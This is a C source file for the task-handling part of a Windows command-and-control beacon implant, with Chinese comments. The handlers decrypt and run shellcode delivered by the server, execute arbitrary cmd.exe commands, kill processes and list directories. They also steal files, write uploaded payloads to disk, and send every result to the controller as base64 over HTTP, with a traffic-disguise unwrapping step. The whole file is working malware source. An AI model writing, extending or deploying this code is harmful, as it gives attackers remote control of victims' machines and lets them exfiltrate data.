#include "beacon.h"
#include <stdint.h>
#include <Psapi.h>

// Sleep任务处理
BEACON_ERROR handle_sleep_task(const char* task_data, BEACON_CONFIG* config) {
    if (!task_data || !config) {
        return BEACON_ERROR_PARAMS;
    }

    DWORD new_sleep_time = atoi(task_data);
    if (new_sleep_time > 0) {
        config->sleep_time = new_sleep_time;
    }

    return BEACON_SUCCESS;
}

// 收集进程信息
static BEACON_ERROR collect_process_info(char** json_data, size_t* offset, size_t* capacity) {
    if (!json_data || !*json_data || !offset || !capacity || *capacity == 0) {
        return BEACON_ERROR_PARAMS;
    }

    HANDLE hSnapshot;
    PROCESSENTRY32W pe32;
    BOOL isFirst = TRUE;
    int process_count = 0;

    // 创建进程快照
    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return BEACON_ERROR_SYSTEM;
    }

    pe32.dwSize = sizeof(PROCESSENTRY32W);

    // 开始JSON数组
    *offset += _snprintf_s(*json_data + *offset, *capacity - *offset, *capacity - *offset - 1,
        "{\n  \"processes\": [\n");

    // 遍历进程
    if (Process32FirstW(hSnapshot, &pe32)) {
        do {
            // 检查缓冲区大小，如果剩余空间小于2KB则扩展缓冲区
            if (*capacity - *offset < 2048) {
                size_t new_capacity = *capacity * 2;
                char* new_buffer = (char*)realloc(*json_data, new_capacity);
                if (!new_buffer) {
                    CloseHandle(hSnapshot);
                    return BEACON_ERROR_MEMORY;
                }
                *json_data = new_buffer;  // 更新调用者的指针
                *capacity = new_capacity;
            }

            // 获取进程路径
            WCHAR fullPath[MAX_PATH] = L"N/A";
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pe32.th32ProcessID);
            if (hProcess) {
                DWORD pathLen = MAX_PATH;
                if (!QueryFullProcessImageNameW(hProcess, 0, fullPath, &pathLen)) {
                    wcscpy_s(fullPath, MAX_PATH, pe32.szExeFile);
                }
                CloseHandle(hProcess);
            }

            // 转换到UTF-8
            char processName[MAX_PATH] = { 0 };
            char processPath[MAX_PATH * 2] = { 0 };
            WideCharToMultiByte(CP_UTF8, 0, pe32.szExeFile, -1, processName, MAX_PATH, NULL, NULL);
            WideCharToMultiByte(CP_UTF8, 0, fullPath, -1, processPath, MAX_PATH * 2, NULL, NULL);

            // 处理路径中的反斜杠
            for (char* p = processPath; *p; p++) {
                if (*p == '\\') {
                    memmove(p + 1, p, strlen(p) + 1);
                    *p++ = '\\';
                }
            }

            // 添加进程信息
            int written = _snprintf_s(*json_data + *offset, *capacity - *offset, *capacity - *offset - 1,
                "%s    {\n"
                "      \"pid\": %lu,\n"
                "      \"name\": \"%s\",\n"
                "      \"path\": \"%s\"\n"
                "    }",
                isFirst ? "" : ",\n", pe32.th32ProcessID, processName, processPath);

            if (written < 0 || written >= (int)(*capacity - *offset)) {
                CloseHandle(hSnapshot);
                return BEACON_ERROR_MEMORY;
            }

            *offset += written;
            isFirst = FALSE;
            process_count++;

        } while (Process32NextW(hSnapshot, &pe32));
    }

    // 关闭JSON数组
    int written = _snprintf_s(*json_data + *offset, *capacity - *offset, *capacity - *offset - 1, "\n  ]\n}");
    if (written < 0 || written >= (int)(*capacity - *offset)) {
        CloseHandle(hSnapshot);
        return BEACON_ERROR_MEMORY;
    }

    *offset += written;
    CloseHandle(hSnapshot);
    return BEACON_SUCCESS;
}

// 处理进程列表任务
BEACON_ERROR handle_proclist_task(const char* task_data, BEACON_CONFIG* config) {
    if (!task_data || !config) {
        return BEACON_ERROR_PARAMS;
    }

    size_t capacity = 1024 * 1024;  // 初始容量1MB
    char* json_data = (char*)malloc(capacity);
    if (!json_data) {
        return BEACON_ERROR_MEMORY;
    }

    size_t offset = 0;
    BEACON_ERROR error = collect_process_info(&json_data, &offset, &capacity);
    
    if (error == BEACON_SUCCESS) {
        // Base64编码JSON数据
        char* encoded_data = NULL;
        base64_encode((const unsigned char*)json_data, offset, &encoded_data);
        if (!encoded_data) {
            free(json_data);
            return BEACON_ERROR_MEMORY;
        }

        // 发送进程列表请求
        HTTP_REQUEST request = {
            .method = L"POST",
            .path = config->api_path,
            .data = encoded_data,
            .data_len = strlen(encoded_data),
            .timeout = 30000,
            .use_ssl = FALSE
        };

        char* response = NULL;
        DWORD response_len = 0;
        error = http_send_request(&request, &response, &response_len);

        if (response) {
            free(response);
        }
        free(encoded_data);
    }

    if (json_data) {
        free(json_data);
    }

    return error;
}

// 处理Shellcode任务
BEACON_ERROR handle_shellcode_task(const char* task_data, size_t data_len, BEACON_CONFIG* config) {
    if (!task_data || !config || data_len == 0) {
        return BEACON_ERROR_PARAMS;
    }

    // Base64解码shellcode数据
    void* decoded_data = NULL;
    size_t decoded_len = 0;
    BEACON_ERROR error = base64_decode(task_data, &decoded_data, &decoded_len);
    if (error != BEACON_SUCCESS || !decoded_data) {
        return error;
    }

    // 使用固定密钥解密（替代 ProductId）
    const char* key = XOR_FIXED_KEY;
    xor_encrypt_decrypt((unsigned char*)decoded_data, decoded_len, key, strlen(key));

    // 分配内存
    LPVOID exec_buffer = VirtualAlloc(NULL, decoded_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_buffer) {
        free(decoded_data);
        return BEACON_ERROR_MEMORY;
    }

    // 复制解码后的shellcode
    memcpy(exec_buffer, decoded_data, decoded_len);
    free(decoded_data);  // 释放解码后的数据
    
    // 修改内存保护
    DWORD old_protect;
    if (!VirtualProtect(exec_buffer, decoded_len, PAGE_EXECUTE_READ, &old_protect)) {
        VirtualFree(exec_buffer, 0, MEM_RELEASE);
        return BEACON_ERROR_SYSTEM;
    }

    // 创建线程执行shellcode
    HANDLE h_thread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec_buffer, NULL, 0, NULL);
    if (!h_thread) {
        VirtualFree(exec_buffer, 0, MEM_RELEASE);
        return BEACON_ERROR_SYSTEM;
    }

    // 等待执行完成
    WaitForSingleObject(h_thread, INFINITE);
    CloseHandle(h_thread);
    VirtualFree(exec_buffer, 0, MEM_RELEASE);

    return BEACON_SUCCESS;
}

// 处理命令执行任务
BEACON_ERROR handle_execute_task(const char* task_data, BEACON_CONFIG* config) {
    if (!task_data || !config) {
        return BEACON_ERROR_PARAMS;
    }

    // 创建管道用于捕获输出
    HANDLE hReadPipe, hWritePipe;
    SECURITY_ATTRIBUTES sa = {0};
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    if (!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)) {
        return BEACON_ERROR_SYSTEM;
    }

    // 设置启动信息
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(STARTUPINFOA);
    si.hStdOutput = hWritePipe;
    si.hStdError = hWritePipe;
    si.dwFlags |= STARTF_USESTDHANDLES;

    // 构造命令行
    char cmdLine[4096];
    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /c %s", task_data);

    // 创建进程
    BOOL success = CreateProcessA(
        NULL,           // 应用程序名
        cmdLine,        // 命令行
        NULL,           // 进程安全属性
        NULL,           // 线程安全属性
        TRUE,           // 继承句柄
        CREATE_NO_WINDOW, // 创建标志
        NULL,           // 环境
        NULL,           // 当前目录
        &si,            // 启动信息
        &pi             // 进程信息
    );

    CloseHandle(hWritePipe); // 关闭写端

    if (!success) {
        CloseHandle(hReadPipe);
        return BEACON_ERROR_SYSTEM;
    }

    // 等待进程完成，最多60秒
    DWORD waitResult = WaitForSingleObject(pi.hProcess, 60000);

    // 读取输出
    char* output_buffer = (char*)malloc(65536); // 64KB缓冲区
    if (!output_buffer) {
        CloseHandle(hReadPipe);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return BEACON_ERROR_MEMORY;
    }

    DWORD bytesRead = 0;
    DWORD totalBytes = 0;
    char tempBuffer[4096];

    // 读取所有输出
    while (ReadFile(hReadPipe, tempBuffer, sizeof(tempBuffer) - 1, &bytesRead, NULL) && bytesRead > 0) {
        if (totalBytes + bytesRead >= 65535) {
            break; // 防止缓冲区溢出
        }
        memcpy(output_buffer + totalBytes, tempBuffer, bytesRead);
        totalBytes += bytesRead;
    }
    output_buffer[totalBytes] = '\0';

    // 如果进程超时，终止进程
    if (waitResult == WAIT_TIMEOUT) {
        TerminateProcess(pi.hProcess, 1);
        strncat(output_buffer, "\n[Command execution timeout after 60 seconds]", 65535 - totalBytes - 1);
    }

    // 清理进程句柄
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadPipe);

    // 发送命令执行结果到服务器
    char* encoded_data = NULL;
    if (totalBytes > 0) {
        // 有输出时，发送实际输出
        base64_encode((const unsigned char*)output_buffer, totalBytes, &encoded_data);
    } else {
        // 没有输出时，发送确认消息
        const char* no_output_msg = "[Command executed successfully, no output]";
        base64_encode((const unsigned char*)no_output_msg, strlen(no_output_msg), &encoded_data);
    }
    
    if (encoded_data) {
        // 发送结果
        HTTP_REQUEST request = {
            .method = L"POST",
            .path = config->api_path,
            .data = encoded_data,
            .data_len = strlen(encoded_data),
            .timeout = 30000,
            .use_ssl = FALSE
        };

        char* response = NULL;
        DWORD response_len = 0;
        http_send_request(&request, &response, &response_len);

        if (response) {
            free(response);
        }
        free(encoded_data);
    }

    free(output_buffer);
    return BEACON_SUCCESS;
}



// 结束进程任务：输入为要结束的PID（十进制字符串）
BEACON_ERROR handle_proc_kill_task(const char* task_data, BEACON_CONFIG* config) {
    if (!task_data || !config) {
        return BEACON_ERROR_PARAMS;
    }

    DWORD pid = strtoul(task_data, NULL, 10);
    if (pid == 0) {
        return BEACON_ERROR_PARAMS;
    }

    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (!hProcess) {
        return BEACON_ERROR_SYSTEM;
    }

    BOOL ok = TerminateProcess(hProcess, 1);
    CloseHandle(hProcess);
    if (!ok) {
        return BEACON_ERROR_SYSTEM;
    }

    // 回传简单结果
    const char* msgPrefix = "Killed PID: ";
    size_t msgLen = strlen(msgPrefix) + 16;
    char* result = (char*)malloc(msgLen);
    if (!result) return BEACON_ERROR_MEMORY;
    snprintf(result, msgLen, "%s%lu", msgPrefix, (unsigned long)pid);

    char* encoded = NULL;
    base64_encode((const unsigned char*)result, strlen(result), &encoded);
    free(result);
    if (encoded) {
        HTTP_REQUEST request = {
            .method = L"POST",
            .path = config->api_path,
            .data = encoded,
            .data_len = strlen(encoded),
            .timeout = 30000,
            .use_ssl = FALSE
        };
        char* resp = NULL; DWORD resp_len = 0;
        http_send_request(&request, &resp, &resp_len);
        if (resp) free(resp);
        free(encoded);
    }
    return BEACON_SUCCESS;
}

// 工具：将UTF-8路径转宽字符
static void utf8_to_wide(const char* src, WCHAR* dst, size_t dstCount) {
    if (!src || !dst || dstCount == 0) return;
    MultiByteToWideChar(CP_UTF8, 0, src, -1, dst, (int)dstCount);
}

// 列目录：task_data 是UTF-8目录路径
BEACON_ERROR handle_file_list_task(const char* task_data, BEACON_CONFIG* config) {
    if (!task_data || !config) return BEACON_ERROR_PARAMS;
    WCHAR wpath[MAX_PATH];
    utf8_to_wide(task_data, wpath, MAX_PATH);

    WIN32_FIND_DATAW ffd; HANDLE hFind;
    WCHAR search[MAX_PATH];
    swprintf_s(search, MAX_PATH, L"%ws\\*", wpath);
    hFind = FindFirstFileW(search, &ffd);
    if (hFind == INVALID_HANDLE_VALUE) {
        // 目录不存在或无法访问，发送错误信息
        const char* error_msg = "Directory not found or access denied";
        char* b64 = NULL; base64_encode((const unsigned char*)error_msg, strlen(error_msg), &b64);
        if (b64) {
            HTTP_REQUEST req = { .method=L"POST", .path=config->api_path, .data=b64, .data_len=strlen(b64), .timeout=30000, .use_ssl=FALSE };
            char* r = NULL; DWORD rl = 0; 
            BEACON_ERROR http_err = http_send_request(&req, &r, &rl); 
            if (r) free(r); 
            free(b64);
            if (http_err != BEACON_SUCCESS) return http_err;
        }
        return BEACON_ERROR_SYSTEM;
    }

    size_t cap = 32 * 1024; size_t off = 0;
    char* json = (char*)malloc(cap);
    if (!json) { 
        FindClose(hFind); 
        // 发送错误信息
        const char* error_msg = "Failed to allocate memory for directory listing";
        char* b64 = NULL; base64_encode((const unsigned char*)error_msg, strlen(error_msg), &b64);
        if (b64) {
            HTTP_REQUEST req = { .method=L"POST", .path=config->api_path, .data=b64, .data_len=strlen(b64), .timeout=30000, .use_ssl=FALSE };
            char* r = NULL; DWORD rl = 0; 
            BEACON_ERROR http_err = http_send_request(&req, &r, &rl); 
            if (r) free(r); 
            free(b64);
            if (http_err != BEACON_SUCCESS) return http_err;
        }
        return BEACON_ERROR_MEMORY; 
    }
    
    off += _snprintf_s(json + off, cap - off, cap - off - 1, "{\n  \"path\": \"%s\",\n  \"entries\": [\n", task_data);

    BOOL first = TRUE;
    do {
        if (wcscmp(ffd.cFileName, L".") == 0 || wcscmp(ffd.cFileName, L"..") == 0) continue;
        if (cap - off < 2048) { 
            size_t nc = cap * 2; 
            char* nb = (char*)realloc(json, nc); 
            if (!nb) { 
                free(json); 
                FindClose(hFind); 
                // 发送错误信息
                const char* error_msg = "Failed to allocate memory for directory listing";
                char* b64 = NULL; base64_encode((const unsigned char*)error_msg, strlen(error_msg), &b64);
                if (b64) {
                    HTTP_REQUEST req = { .method=L"POST", .path=config->api_path, .data=b64, .data_len=strlen(b64), .timeout=30000, .use_ssl=FALSE };
                    char* r = NULL; DWORD rl = 0; 
                    BEACON_ERROR http_err = http_send_request(&req, &r, &rl); 
                    if (r) free(r); 
                    free(b64);
                    if (http_err != BEACON_SUCCESS) return http_err;
                }
                return BEACON_ERROR_MEMORY; 
            } 
            json = nb; 
            cap = nc; 
        }
        char name[1024] = {0};
        WideCharToMultiByte(CP_UTF8, 0, ffd.cFileName, -1, name, 1024, NULL, NULL);
        BOOL isDir = (ffd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) != 0;
        ULARGE_INTEGER fileSize; fileSize.HighPart = ffd.nFileSizeHigh; fileSize.LowPart = ffd.nFileSizeLow;
        off += _snprintf_s(json + off, cap - off, cap - off - 1,
            "%s    {\"name\": \"%s\", \"dir\": %s, \"size\": %llu }",
            first ? "" : ",\n", name, isDir ? "true" : "false", (unsigned long long)fileSize.QuadPart);
        first = FALSE;
    } while (FindNextFileW(hFind, &ffd));
    FindClose(hFind);

    off += _snprintf_s(json + off, cap - off, cap - off - 1, "\n  ]\n}");

    char* b64 = NULL; 
    base64_encode((const unsigned char*)json, off, &b64);
    free(json);
    if (!b64) return BEACON_ERROR_MEMORY;
    
    HTTP_REQUEST req = { .method=L"POST", .path=config->api_path, .data=b64, .data_len=strlen(b64), .timeout=30000, .use_ssl=FALSE };
    char* r = NULL; 
    DWORD rl = 0; 
    BEACON_ERROR http_err = http_send_request(&req, &r, &rl); 
    if (r) free(r); 
    free(b64);
    
    if (http_err != BEACON_SUCCESS) {
        return http_err;
    }
    
    return BEACON_SUCCESS;
}

// 简化版文件下载：task_data 直接是文件路径，回传 Base64(二进制)
BEACON_ERROR handle_file_download_task(const char* task_data, BEACON_CONFIG* config) {
    if (!task_data || !config) return BEACON_ERROR_PARAMS;
    
    // 调试信息（可编译关闭）
    LOG_DEBUG("[DEBUG] handle_file_download_task: task_data='%s', length=%zu\n", task_data, strlen(task_data));
    
    const char* payload = task_data;
    // 简化：不再支持RANGE分片，直接下载整个文件

    WCHAR wpath[MAX_PATH]; utf8_to_wide(payload, wpath, MAX_PATH);
    HANDLE h = CreateFileW(wpath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        // 文件不存在或无法访问，发送错误信息
        const char* error_msg = "File not found or access denied";
        char* b64 = NULL; base64_encode((const unsigned char*)error_msg, strlen(error_msg), &b64);
        if (b64) {
            HTTP_REQUEST req = { .method=L"POST", .path=config->api_path, .data=b64, .data_len=strlen(b64), .timeout=30000, .use_ssl=FALSE };
            char* r = NULL; DWORD rl = 0; 
            BEACON_ERROR http_err = http_send_request(&req, &r, &rl); 
            if (r) free(r); 
            free(b64);
            if (http_err != BEACON_SUCCESS) return http_err;
        }
        return BEACON_ERROR_SYSTEM;
    }
    
    // 简化：直接读取整个文件
    DWORD fileSize = GetFileSize(h, NULL);
    if (fileSize == INVALID_FILE_SIZE) { 
        CloseHandle(h); 
        const char* error_msg = "Failed to get file size";
        char* b64 = NULL; base64_encode((const unsigned char*)error_msg, strlen(error_msg), &b64);
        if (b64) {
            HTTP_REQUEST req = { .method=L"POST", .path=config->api_path, .data=b64, .data_len=strlen(b64), .timeout=30000, .use_ssl=FALSE };
            char* r = NULL; DWORD rl = 0; 
            BEACON_ERROR http_err = http_send_request(&req, &r, &rl); 
            if (r) free(r); 
            free(b64);
            if (http_err != BEACON_SUCCESS) return http_err;
        }
        return BEACON_ERROR_SYSTEM; 
    }
    
    // 检查文件大小，避免过大文件导致内存问题
    const DWORD MAX_FILE_SIZE = 100 * 1024 * 1024; // 100MB 限制
    if (fileSize > MAX_FILE_SIZE) {
        CloseHandle(h);
        const char* error_msg = "File too large (max 100MB)";
        char* b64 = NULL; base64_encode((const unsigned char*)error_msg, strlen(error_msg), &b64);
        if (b64) {
            HTTP_REQUEST req = { .method=L"POST", .path=config->api_path, .data=b64, .data_len=strlen(b64), .timeout=30000, .use_ssl=FALSE };
            char* r = NULL; DWORD rl = 0; 
            BEACON_ERROR http_err = http_send_request(&req, &r, &rl); 
            if (r) free(r); 
            free(b64);
            if (http_err != BEACON_SUCCESS) return http_err;
        }
        return BEACON_ERROR_SYSTEM;
    }
    
    // 分配内存并读取文件
    unsigned char* buf = (unsigned char*)malloc(fileSize);
    if (!buf) { 
        CloseHandle(h); 
        const char* error_msg = "Failed to allocate memory for file read";
        char* b64 = NULL; base64_encode((const unsigned char*)error_msg, strlen(error_msg), &b64);
        if (b64) {
            HTTP_REQUEST req = { .method=L"POST", .path=config->api_path, .data=b64, .data_len=strlen(b64), .timeout=30000, .use_ssl=FALSE };
            char* r = NULL; DWORD rl = 0; 
            BEACON_ERROR http_err = http_send_request(&req, &r, &rl); 
            if (r) free(r); 
            free(b64);
            if (http_err != BEACON_SUCCESS) return http_err;
        }
        return BEACON_ERROR_MEMORY; 
    }
    
    // 读取整个文件
    DWORD bytesRead = 0;
    BOOL readSuccess = ReadFile(h, buf, fileSize, &bytesRead, NULL);
    CloseHandle(h);
    
    if (!readSuccess || bytesRead != fileSize) {
        free(buf);
        const char* error_msg = "Failed to read file";
        char* b64 = NULL; base64_encode((const unsigned char*)error_msg, strlen(error_msg), &b64);
        if (b64) {
            HTTP_REQUEST req = { .method=L"POST", .path=config->api_path, .data=b64, .data_len=strlen(b64), .timeout=30000, .use_ssl=FALSE };
            char* r = NULL; DWORD rl = 0; 
            BEACON_ERROR http_err = http_send_request(&req, &r, &rl); 
            if (r) free(r); 
            free(b64);
            if (http_err != BEACON_SUCCESS) return http_err;
        }
        return BEACON_ERROR_SYSTEM;
    }
    
    // 成功日志（可编译关闭）
    LOG_DEBUG("[SUCCESS] File download completed: path='%s', size=%lu bytes\n", payload, bytesRead);
    
    // Base64编码并发送
    char* b64 = NULL; 
    base64_encode(buf, bytesRead, &b64); 
    free(buf); 
    if (!b64) return BEACON_ERROR_MEMORY;
    
    HTTP_REQUEST req = { .method=L"POST", .path=config->api_path, .data=b64, .data_len=strlen(b64), .timeout=30000, .use_ssl=FALSE };
    char* r = NULL; 
    DWORD rl = 0; 
    BEACON_ERROR http_err = http_send_request(&req, &r, &rl); 
    if (r) free(r); 
    free(b64);
    
    if (http_err != BEACON_SUCCESS) {
        return http_err;
    }
    
    return BEACON_SUCCESS;
}

// 上传文件：task_data 采用两种格式：
// 1) 全量："<utf8_path>\n<base64_content>"
// 文件上传任务：<utf8_path>\n<base64_content>
// 注意：task_data 已经去除了任务类型字节，直接是payload部分
BEACON_ERROR handle_file_upload_task(const char* task_data, BEACON_CONFIG* config) {
    if (!task_data || !config) return BEACON_ERROR_PARAMS;
    
    // 调试信息（可编译关闭）
    LOG_DEBUG("[DEBUG] handle_file_upload_task: task_data='%s', length=%zu\n", task_data, strlen(task_data));
    
    // 首先移除流量伪装包装
    char* unwrapped_data = unwrap_data_from_disguise(task_data);
    if (!unwrapped_data) {
        // 如果没有包装，直接使用原始数据
        unwrapped_data = (char*)task_data;
    }
    
    // 解包后的调试信息（可编译关闭）
    LOG_DEBUG("[DEBUG] handle_file_upload_task: unwrapped_data='%s', length=%zu\n", unwrapped_data, strlen(unwrapped_data));
    
    const char* nl = strchr(unwrapped_data, '\n');
    if (!nl) return BEACON_ERROR_PARAMS;
    size_t pathLen = (size_t)(nl - unwrapped_data);
    char* path = (char*)malloc(pathLen + 1);
    if (!path) return BEACON_ERROR_MEMORY;
    memcpy(path, unwrapped_data, pathLen); path[pathLen] = '\0';
    const char* base64Data = nl + 1;

    // 添加调试日志
    char debug_info[512];
    snprintf(debug_info, sizeof(debug_info), "File upload task: path='%s', base64_length=%zu, first_10_chars='%.10s'", 
             path, strlen(base64Data), base64Data);
    
    // 输出调试信息（可编译关闭）
    LOG_DEBUG("[DEBUG] %s\n", debug_info);
    
    // Base64解码
    void* bin = NULL; 
    size_t binLen = 0; 
    BEACON_ERROR e = base64_decode(base64Data, &bin, &binLen);
    if (e != BEACON_SUCCESS || !bin) { 
        free(path); 
        // 发送错误信息
        const char* error_msg = "Failed to decode base64 data";
        char* b64 = NULL; 
        base64_encode((const unsigned char*)error_msg, strlen(error_msg), &b64);
        if (b64) {
            HTTP_REQUEST req = { .method=L"POST", .path=config->api_path, .data=b64, .data_len=strlen(b64), .timeout=30000, .use_ssl=FALSE };
            char* r = NULL; 
            DWORD rl = 0; 
            BEACON_ERROR http_err = http_send_request(&req, &r, &rl); 
            if (r) free(r); 
            free(b64);
            if (http_err != BEACON_SUCCESS) return http_err;
        }
        return e; 
    }
    
    // 创建文件并写入
    WCHAR wpath[MAX_PATH]; 
    utf8_to_wide(path, wpath, MAX_PATH);
    HANDLE h = CreateFileW(wpath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (h == INVALID_HANDLE_VALUE) { 
        free(path); 
        free(bin); 
        // 如果unwrapped_data是动态分配的，需要释放
        if (unwrapped_data != task_data) {
            free(unwrapped_data);
        }
        // 发送错误信息
        const char* error_msg = "Failed to create file for writing";
        char* b64 = NULL; 
        base64_encode((const unsigned char*)error_msg, strlen(error_msg), &b64);
        if (b64) {
            HTTP_REQUEST req = { .method=L"POST", .path=config->api_path, .data=b64, .data_len=strlen(b64), .timeout=30000, .use_ssl=FALSE };
            char* r = NULL; 
            DWORD rl = 0; 
            BEACON_ERROR http_err = http_send_request(&req, &r, &rl); 
            if (r) free(r); 
            free(b64);
            if (http_err != BEACON_SUCCESS) return http_err;
        }
        return BEACON_ERROR_SYSTEM; 
    }
    
    // 写入文件数据
    DWORD wr = 0; 
    BOOL ok = WriteFile(h, bin, (DWORD)binLen, &wr, NULL); 
    CloseHandle(h); 
    free(bin); 
    free(path);
    
    // 如果unwrapped_data是动态分配的，需要释放
    if (unwrapped_data != task_data) {
        free(unwrapped_data);
    }
    
    if (!ok) {
        // 发送错误信息
        const char* error_msg = "Failed to write file data";
        char* b64 = NULL; 
        base64_encode((const unsigned char*)error_msg, strlen(error_msg), &b64);
        if (b64) {
            HTTP_REQUEST req = { .method=L"POST", .path=config->api_path, .data=b64, .data_len=strlen(b64), .timeout=30000, .use_ssl=FALSE };
            char* r = NULL; 
            DWORD rl = 0; 
            BEACON_ERROR http_err = http_send_request(&req, &r, &rl); 
            if (r) free(r); 
            free(b64);
            if (http_err != BEACON_SUCCESS) return http_err;
        }
        return BEACON_ERROR_SYSTEM; 
    }
    
    // 发送成功确认消息
    const char* done = "Upload OK";
    char* b64 = NULL; 
    base64_encode((const unsigned char*)done, strlen(done), &b64);
    
    // 添加成功日志
    char success_info[512];
    snprintf(success_info, sizeof(success_info), "File upload completed: path='%s', size=%zu bytes", 
             path, binLen);
    
    // 成功信息（可编译关闭）
    LOG_DEBUG("[SUCCESS] %s\n", success_info);
    
    if (b64) { 
        // 注意：这里应该发送到beacon的check-in端点，而不是api_path
        // 但是为了保持兼容性，我们仍然发送到api_path，让服务器端处理
        HTTP_REQUEST req = {.method=L"POST", .path=config->api_path, .data=b64, .data_len=strlen(b64), .timeout=30000, .use_ssl=FALSE}; 
        
        // 调试信息（可编译关闭）
        LOG_DEBUG("[DEBUG] Sending upload confirmation: path=%ls, data='%s', length=%d\n", 
               config->api_path, b64, (int)strlen(b64));
        
        char* r = NULL; 
        DWORD rl = 0; 
        BEACON_ERROR http_err = http_send_request(&req, &r, &rl); 
        
        // HTTP请求结果调试信息（可编译关闭）
        LOG_DEBUG("[DEBUG] HTTP request result: error=%d, response_length=%d\n", http_err, rl);
        if (r && rl > 0) {
            LOG_DEBUG("[DEBUG] HTTP response: %.*s\n", rl, r);
        }
        
        if(r) free(r); 
        free(b64);
        if (http_err != BEACON_SUCCESS) {
            // 即使发送确认失败，我们也不应该返回错误，因为文件已经成功写入
            // 只是记录一下，让服务器端知道任务可能超时
            LOG_DEBUG("[WARNING] Failed to send upload confirmation: HTTP error %d\n", http_err);
            return BEACON_SUCCESS; // 改为返回成功，避免因为网络问题导致任务失败
        }
    } else {
        return BEACON_ERROR_MEMORY;
    }
    
    return BEACON_SUCCESS;
}

// 删除文件：task_data 是UTF-8路径（文件或空目录）
BEACON_ERROR handle_file_delete_task(const char* task_data, BEACON_CONFIG* config) {
    if (!task_data || !config) return BEACON_ERROR_PARAMS;
    WCHAR wpath[MAX_PATH]; utf8_to_wide(task_data, wpath, MAX_PATH);
    BOOL ok = DeleteFileW(wpath);
    if (!ok) {
        ok = RemoveDirectoryW(wpath);
        if (!ok) return BEACON_ERROR_SYSTEM;
    }
    const char* done = "Delete OK";
    char* b64=NULL; base64_encode((const unsigned char*)done, strlen(done), &b64);
    if (b64) { HTTP_REQUEST req={.method=L"POST", .path=config->api_path, .data=b64, .data_len=strlen(b64), .timeout=30000, .use_ssl=FALSE}; char* r=NULL; DWORD rl=0; http_send_request(&req,&r,&rl); if(r) free(r); free(b64);}    
    return BEACON_SUCCESS;
}

// 新建目录：task_data 是UTF-8路径
BEACON_ERROR handle_file_mkdir_task(const char* task_data, BEACON_CONFIG* config) {
    if (!task_data || !config) return BEACON_ERROR_PARAMS;
    WCHAR wpath[MAX_PATH]; utf8_to_wide(task_data, wpath, MAX_PATH);
    BOOL ok = CreateDirectoryW(wpath, NULL);
    if (!ok && GetLastError() != ERROR_ALREADY_EXISTS) return BEACON_ERROR_SYSTEM;
    const char* done = "Mkdir OK";
    char* b64=NULL; base64_encode((const unsigned char*)done, strlen(done), &b64);
    if (b64) { HTTP_REQUEST req={.method=L"POST", .path=config->api_path, .data=b64, .data_len=strlen(b64), .timeout=30000, .use_ssl=FALSE}; char* r=NULL; DWORD rl=0; http_send_request(&req,&r,&rl); if(r) free(r); free(b64);}    
    return BEACON_SUCCESS;
}

// 处理文件信息任务
BEACON_ERROR handle_file_info_task(const char* task_data, BEACON_CONFIG* config) {
    if (!task_data || !config) {
        return BEACON_ERROR_PARAMS;
    }

    // 解析文件路径
    char file_path[MAX_PATH_LENGTH];
    if (sscanf(task_data, "FILE_INFO:%s", file_path) != 1) {
        return BEACON_ERROR_PARAMS;
    }

    // 获取文件信息
    WIN32_FILE_ATTRIBUTE_DATA fileData;
    if (!GetFileAttributesExA(file_path, GetFileExInfoStandard, &fileData)) {
        // 文件不存在或无法访问
        char* error_msg = "File not found or inaccessible";
        char* encoded_data = NULL;
        base64_encode((const unsigned char*)error_msg, strlen(error_msg), &encoded_data);
        
        if (encoded_data) {
            // 发送错误信息
            HTTP_REQUEST request = {
                .method = L"POST",
                .path = config->api_path,
                .data = encoded_data,
                .data_len = strlen(encoded_data),
                .timeout = 30000,
                .use_ssl = FALSE
            };

            char* response = NULL;
            DWORD response_len = 0;
            http_send_request(&request, &response, &response_len);

            if (response) {
                free(response);
            }
            free(encoded_data);
        }
        return BEACON_ERROR_SYSTEM;
    }

    // 构造文件信息JSON
    char info_json[1024];
    snprintf(info_json, sizeof(info_json),
        "{\"path\":\"%s\",\"size\":%lld,\"exists\":true}",
        file_path,
        ((LONGLONG)fileData.nFileSizeHigh << 32) | fileData.nFileSizeLow);

    // 编码并发送
    char* encoded_data = NULL;
    base64_encode((const unsigned char*)info_json, strlen(info_json), &encoded_data);
    
    if (encoded_data) {
        HTTP_REQUEST request = {
            .method = L"POST",
            .path = config->api_path,
            .data = encoded_data,
            .data_len = strlen(encoded_data),
            .timeout = 30000,
            .use_ssl = FALSE
        };

        char* response = NULL;
        DWORD response_len = 0;
        http_send_request(&request, &response, &response_len);

        if (response) {
            free(response);
        }
        free(encoded_data);
    }

    return BEACON_SUCCESS;
}
